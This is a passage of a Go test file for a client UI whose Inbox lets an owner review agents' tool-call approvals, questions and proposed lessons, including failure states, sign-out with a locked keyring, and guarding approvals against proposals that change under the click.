	args, _ := json.Marshal(map[string]string{"path": "deploy.sh", "content": content})
	x.srv.AddApproval(proto.Approval{ID: "a1", SessionID: 1, CallID: "w1", Tool: "write", Arguments: args,
		State: proto.ApprovalPending, RequestedAt: at(-time.Minute)})
	x.connect(t)
	full := state.IndentArguments(args)
	x.click(t, "Arguments")
	x.hasAll(t, "Show All Arguments", "Copy All")
	x.click(t, "Show All Arguments")
	field, ok := x.tt.AccessByRole(ui.RoleTextField, "Complete arguments")
	if !ok || field.Value != full {
		t.Fatalf("the complete arguments show %d of %d bytes (found %v)", len(field.Value), len(full), ok)
	}
	if !field.ReadOnly {
		t.Error("the owner can edit the arguments they are asked to allow")
	}
	x.snapshot(t, "approval-all-arguments")
	x.click(t, "Copy All")
	if got := x.tt.Clipboard(); got != full {
		t.Errorf("Copy All copied %d of %d bytes", len(got), len(full))
	}
}

// TestAnInboxThatFailedToLoadSaysSo fails the approvals' first fetch: the
// Inbox offers to try again and never says that nothing waits.
func TestAnInboxThatFailedToLoadSaysSo(t *testing.T) {
	x := newTestApp(t)
	x.seed()
	x.srv.FailOnce(http.MethodGet, proto.PathApprovals, http.StatusBadGateway)
	x.connect(t)
	x.hasAll(t, "Try Again", "The approvals are not loaded")
	if x.tt.HasText("Nothing waits for you") {
		t.Fatal("the Inbox says nothing waits though its approvals did not load")
	}
	if !strings.Contains(strings.Join(x.tt.Texts(), " "), "Loading the approvals failed") {
		t.Errorf("no failure in %q", x.tt.Texts())
	}
	x.click(t, "Try Again")
	x.until(t, func() bool { return len(x.a.st.Data.Approvals()) == 2 && x.a.st.InFlight() == 0 })
	x.hasAll(t, "write waits for your approval", "2 tool calls wait for you")
	if x.tt.HasText("Try Again") {
		t.Error("the failure still shows after the approvals loaded")
	}
}

// TestSigningOutEndsTheAutomaticSignInEvenIfTheKeyringKeepsTheToken has a
// locked keyring refuse to delete the token: the owner sees it, and the
// next start does not sign in with the token left behind.
func TestSigningOutEndsTheAutomaticSignInEvenIfTheKeyringKeepsTheToken(t *testing.T) {
	x := newTestApp(t)
	x.a.signIn.server, x.a.signIn.token = x.srv.URL, pocketdtest.Token
	x.settle()
	x.click(t, "Connect")
	x.until(t, func() bool { return x.a.st.Conn.State == state.Connected })
	if st, _ := x.store.Load(); st.Server != x.srv.URL {
		t.Fatalf("the sign-in is not kept: %+v", st)
	}
	x.ring.deleteErr = errors.New("the keyring is locked")
	x.a.confirmSignOut()
	x.settle()
	x.click(t, "Sign Out")
	x.hasAll(t, "Connect to pocketd")
	if !strings.Contains(x.a.signIn.err, "the keyring is locked") {
		t.Errorf("the sign-in screen says %q; want the keyring's failure", x.a.signIn.err)
	}
	st, _ := x.store.Load()
	if st.Server != "" || st.LastServer != x.srv.URL {
		t.Errorf("settings %+v: want no automatic sign-in, and the form to offer the service", st)
	}
	if tok, _ := x.creds.Token(x.srv.URL); tok == "" {
		t.Fatal("the test's keyring lost the token: it should have kept it")
	}
	// The keyring unlocks; the program starts again.
	x.ring.deleteErr = nil
	again := x.newApp(t)
	again.Start()
	x.loop.Flush()
	if again.st.SignedIn() {
		t.Error("the next start signed in with the token the owner signed out of")
	}
	if again.signIn.server != x.srv.URL {
		t.Errorf("the form offers %q", again.signIn.server)
	}
}

// A specialist's question waits in the Inbox with its suggested answers;
// one click answers it, and another answer can be typed (ADR-0014).
func TestAQuestionInTheInboxSnapshot(t *testing.T) {
	x := newTestApp(t)
	model := proto.ModelRef{Provider: "anthropic", ID: "claude-opus-5-5"}
	x.srv.AddSession(proto.Session{ID: 7, Title: "T1 · Fix the flaky arm64 job", Cwd: "/home/team/projects/nsl--vera-fix-the-flaky-arm64-job-t1",
		Model: model, Profile: "vera", Route: "profile", State: proto.SessionIdle, UpdatedAt: at(-time.Minute)})
	x.srv.AddAsk(proto.Ask{ID: 1, Thread: 1, SessionID: 7, Question: "PR #31 is ready. Squash the 4 commits when it merges?",
		Options: []string{"Squash", "Keep the commits"}, State: proto.AskOpen, CreatedAt: at(-2 * time.Minute)})
	x.srv.AddAsk(proto.Ask{ID: 2, Thread: 1, SessionID: 7, Question: "The runner image is 2 years old. Which version should the job pin?",
		State: proto.AskOpen, CreatedAt: at(-time.Minute)})
	x.connect(t)
	x.hasAll(t, "A1 asks you", "A2 asks you", "T1 · Fix the flaky arm64 job", "Squash", "Keep the commits",
		"PR #31 is ready. Squash the 4 commits when it merges?", "2 questions wait for you", "2 questions wait")
	x.snapshot(t, "inbox-questions")

	x.click(t, "Squash")
	x.until(t, func() bool { return len(x.a.st.Data.Asks()) == 1 })
	var body proto.AnswerAsk
	reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathAsk, 1))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Answer != "Squash" || body.RequestID == "" {
		t.Fatalf("the answer sent %+v", reqs)
	}
	x.hasAll(t, "1 question waits for you")

	// A question without options takes a typed answer.
	if b, ok := x.tt.AccessByRole(ui.RoleButton, "Answer"); !ok || !b.Disabled {
		t.Errorf("Answer is enabled with nothing typed: %+v, found %v", b, ok)
	}
	x.typeInto(t, "Answer to A2", "ubuntu-24.04")
	x.click(t, "Answer")
	x.until(t, func() bool { return len(x.a.st.Data.Asks()) == 0 })
	reqs = x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathAsk, 2))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Answer != "ubuntu-24.04" {
		t.Fatalf("the typed answer sent %+v", reqs)
	}
	x.hasAll(t, "Nothing waits for you")
}

// An Inbox whose questions failed to load says so, and never that nothing
// waits.
func TestAnInboxWhoseQuestionsFailedToLoadSaysSo(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddAsk(proto.Ask{ID: 1, Thread: 1, SessionID: 7, Question: "Squash?", State: proto.AskOpen, CreatedAt: at(-time.Minute)})
	x.srv.FailOnce(http.MethodGet, proto.PathAsks, http.StatusBadGateway)
	x.connect(t)
	x.hasAll(t, "Try Again", "The questions are not loaded")
	if x.tt.HasText("Nothing waits for you") {
		t.Fatal("the Inbox says nothing waits though its questions did not load")
	}
	x.click(t, "Try Again")
	x.until(t, func() bool { return len(x.a.st.Data.Asks()) == 1 && x.a.st.InFlight() == 0 })
	x.hasAll(t, "A1 asks you", "1 question waits for you")
}

// An ask whose options repeat draws each as its own button.
func TestAnAskWithRepeatedOptionsDraws(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddAsk(proto.Ask{ID: 1, Thread: 1, SessionID: 7, Question: "Ship?", Options: []string{"yes", "yes", "no"},
		State: proto.AskOpen, CreatedAt: at(-time.Minute)})
	x.connect(t)
	x.hasAll(t, "Ship?", "yes", "no")
}

// An answer's draft goes once its question leaves the Inbox, answered here
// or elsewhere; a draft for a question that still waits stays.
func TestADraftLeavesWithItsQuestion(t *testing.T) {
	x := newTestApp(t)
	for _, id := range []int64{1, 2} {
		x.srv.AddAsk(proto.Ask{ID: id, Thread: 1, SessionID: 7, Question: "Q" + itoa(int(id)) + "?", State: proto.AskOpen, CreatedAt: at(time.Duration(id) * time.Minute)})
	}
	x.connect(t)
	x.typeInto(t, "Answer to A1", "half-written")
	x.typeInto(t, "Answer to A2", "kept")
	answered := proto.Ask{ID: 1, Thread: 1, SessionID: 7, Question: "Q1?", State: proto.AskAnswered, Answer: "elsewhere", CreatedAt: at(time.Minute)}
	x.srv.Emit(proto.Event{Type: proto.EventAsk, Ask: &answered})
	x.until(t, func() bool { return len(x.a.st.Data.Asks()) == 1 })
	if _, kept := x.a.answers[1]; kept {
		t.Error("the draft of an answered question stays")
	}
	if draft := x.a.answers[2]; draft == nil || *draft != "kept" {
		t.Errorf("the draft of a waiting question: %v", draft)
	}
}

// A lesson an agent proposes waits in the Inbox with exactly the text the
// owner approves; a change to a lesson in force shows both texts, and
// Discard keeps the one in force (ADR-0015).
func TestALessonInTheInboxSnapshot(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddLesson(proto.Lesson{ID: 1, Agent: "vera", Text: "Run the tests before you open a pull request.", State: proto.LessonPending,
		Writer: "vera", SessionID: 7, CreatedAt: at(-2 * time.Minute)})
	x.srv.AddLesson(proto.Lesson{ID: 2, Agent: "duncan", Text: "Ask before a rewrite.", State: proto.LessonActive, Writer: "duncan",
		Change: &proto.LessonChange{Text: "Ask the owner before any rewrite of more than one file.", Writer: "duncan"}, CreatedAt: at(-time.Minute)})
	x.srv.AddLesson(proto.Lesson{ID: 3, Agent: "duncan", Text: "Kept as it is.", State: proto.LessonActive, Writer: "duncan", CreatedAt: at(-time.Minute)})
	x.connect(t)
	x.hasAll(t, "A lesson for vera waits for your approval", "Run the tests before you open a pull request.",
		"New text for L2 of duncan waits for your approval", "In force now:", "Ask before a rewrite.",
		"Ask the owner before any rewrite of more than one file.", "2 lessons wait for you", "2 lessons wait")
	if x.tt.HasText("Kept as it is.") {
		t.Error("a lesson with nothing waiting is in the Inbox")
	}
	x.snapshot(t, "inbox-lessons")

	x.click(t, "Approve")
	x.until(t, func() bool { return len(x.a.st.Data.Lessons()) == 1 })
	var body proto.DecideLesson
	reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathLesson, 1))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Decision != proto.LessonApprove ||
		body.Text != "Run the tests before you open a pull request." || body.RequestID == "" {
		t.Fatalf("the approval sent %+v", reqs)
	}
	x.hasAll(t, "1 lesson waits for you")
	x.click(t, "Discard")
	x.until(t, func() bool { return len(x.a.st.Data.Lessons()) == 0 })
	reqs = x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathLesson, 2))
	body = proto.DecideLesson{}
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Decision != proto.LessonDiscard || body.Text != "" {
		t.Fatalf("the discard sent %+v", reqs)
	}
	x.hasAll(t, "Nothing waits for you")
}

// An Inbox whose lessons failed to load says so, and never that nothing
// waits.
func TestAnInboxWhoseLessonsFailedToLoadSaysSo(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddLesson(proto.Lesson{ID: 1, Agent: "vera", Text: "Run the tests.", State: proto.LessonPending, CreatedAt: at(-time.Minute)})
	x.srv.FailOnce(http.MethodGet, proto.PathLessons, http.StatusBadGateway)
	x.connect(t)
	x.hasAll(t, "Try Again", "The lessons are not loaded")
	if x.tt.HasText("Nothing waits for you") {
		t.Fatal("the Inbox says nothing waits though its lessons did not load")
	}
	x.click(t, "Try Again")
	x.until(t, func() bool { return len(x.a.st.Data.Lessons()) == 1 && x.a.st.InFlight() == 0 })
	x.hasAll(t, "A lesson for vera waits for your approval", "1 lesson waits for you")
}

// A click on Approve approves the proposal the card showed when it was
// clicked: one the agent changed before the click reached the next frame
// is another card, and the click approves nothing (Codex review of #18,
// round 1).
func TestApproveNeverApprovesAProposalThatChangedUnderTheClick(t *testing.T) {
	x := newTestApp(t)
	inForce := proto.Lesson{ID: 1, Agent: "vera", Text: "a", State: proto.LessonActive, Writer: "vera",
		Change: &proto.LessonChange{Text: "b", Writer: "vera"}, CreatedAt: at(-time.Minute)}
	x.srv.AddLesson(inForce)
	x.connect(t)
	x.hasAll(t, "b")
	// The agent proposes other text; the client has it, and has not drawn
	// it yet when the owner's click lands.
	changed := inForce
	changed.Change = &proto.LessonChange{Text: "c", Writer: "vera"}
	x.srv.Emit(proto.Event{Type: proto.EventLesson, Lesson: &changed})
	x.loop.RunUntil(t, func() bool {
		l, _ := x.a.st.Data.Lesson(1)
		return l.Change != nil && l.Change.Text == "c"
	})
	if err := x.tt.Click("Approve"); err != nil {
		t.Fatal(err)
	}
	x.settle()
	x.loop.Flush()
	if reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathLesson, 1)); len(reqs) != 0 {
		t.Fatalf("a click on the old proposal approved the new one: %+v", reqs)
	}
	x.hasAll(t, "c")
}

// The owner forgets a lesson in force from the Inbox: the folded list of
// lessons in force offers Forget for each (ADR-0015, Codex review of #18,
// round 2).
func TestTheOwnerForgetsALessonInForce(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddLesson(proto.Lesson{ID: 4, Agent: "vera", Text: "Squash before merging.", State: proto.LessonActive, Writer: "vera", CreatedAt: at(-time.Minute)})
	x.connect(t)
	x.hasAll(t, "Lessons in force", "Nothing waits for you")
	if x.tt.HasText("Squash before merging.") {
		t.Fatal("the folded list shows its lessons")
	}
	x.click(t, "Lessons in force")
	x.hasAll(t, "Squash before merging.", "L4 · vera")
	x.click(t, "Forget")
	x.until(t, func() bool { return len(x.a.st.Data.LessonsInForce()) == 0 })
	var body proto.DecideLesson
	reqs := x.srv.RequestsTo(http.MethodPost, proto.Path(proto.PathLesson, 4))
	if len(reqs) != 1 || json.Unmarshal(reqs[0].Body, &body) != nil || body.Decision != proto.LessonForget || body.Text != "" || body.Forget {
		t.Fatalf("the forget sent %+v", reqs)
	}
	if x.tt.HasText("Lessons in force") {
		t.Error("an empty list of lessons in force is drawn")
	}
}

// Everything that waits comes first in the Inbox, approvals included; the
// lessons in force, which wait for nothing, come last (Codex review of
// #18, round 3).
func TestTheInboxListsLessonsInForceLast(t *testing.T) {
	x := newTestApp(t)
	x.srv.AddApproval(proto.Approval{ID: "a1", SessionID: 1, CallID: "w1", Tool: "write",
		Arguments: json.RawMessage(`{"path":"a.txt"}`), State: proto.ApprovalPending, RequestedAt: at(-time.Minute)})
	x.srv.AddLesson(proto.Lesson{ID: 4, Agent: "vera", Text: "Squash before merging.", State: proto.LessonActive, Writer: "vera", CreatedAt: at(-2 * time.Minute)})
	x.connect(t)
	x.click(t, "Lessons in force")
	texts := x.tt.Texts()
	approval := slices.IndexFunc(texts, func(s string) bool { return strings.Contains(s, "write waits for your approval") })
	inForce := slices.Index(texts, "Lessons in force")
	if approval < 0 || inForce < 0 || approval > inForce {
		t.Fatalf("the approval at %d, the lessons in force at %d: %q", approval, inForce, texts)
	}
}
